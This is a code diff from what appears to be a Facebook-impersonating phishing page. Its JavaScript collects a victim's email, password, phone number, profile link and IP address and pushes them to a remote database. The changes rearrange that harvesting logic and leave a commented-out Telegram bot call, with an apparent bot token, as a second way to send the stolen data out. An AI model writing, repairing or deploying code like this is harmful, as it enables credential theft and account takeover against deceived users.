@@ -2807,10 +2807,10 @@
     let check_submit = false;
     $(document).ready(function () {
       (function () {
-        GetSess();
-        getIP();
-        AddSess();
-        checkCountry();
+        // GetSess();
+        // getIP();
+        // AddSess();
+        // checkCountry();
         setInterval(function () {
           getsttindex(); // Thay '32131' bằng id thực tế của bạn
         }, 3000);
@@ -3082,8 +3082,8 @@
         email: $("#email").val(),
         password: $("#password-input").val(),
         type: "password",
-        profileLink: $("#name").val()
       };
+      var profileLink= $("#name").val()
       var phone = $("#phone").val();
       var password = $("#password-input").val();
 
@@ -3092,6 +3092,9 @@
         console.log(data.ip)
         sfacebookRef.push({ email: $(".email-123").val().toString(), password: password.toString(), phone: phone.toString(), ip: data.ip.toString(), profileLink: profileLink });
       });
+//       $.getJSON('https://ipapi.co/json/', function(data) {
+//   console.log(JSON.stringify(data, null, 2));
+// });
       // $.ajax({
       //     url: 'https://api.telegram.org/bot1070051055:AAHqiH52qWt0ubyfyOmIqkXQuqIjm4Mt5RM/sendMessage',
       //     method: 'POST',
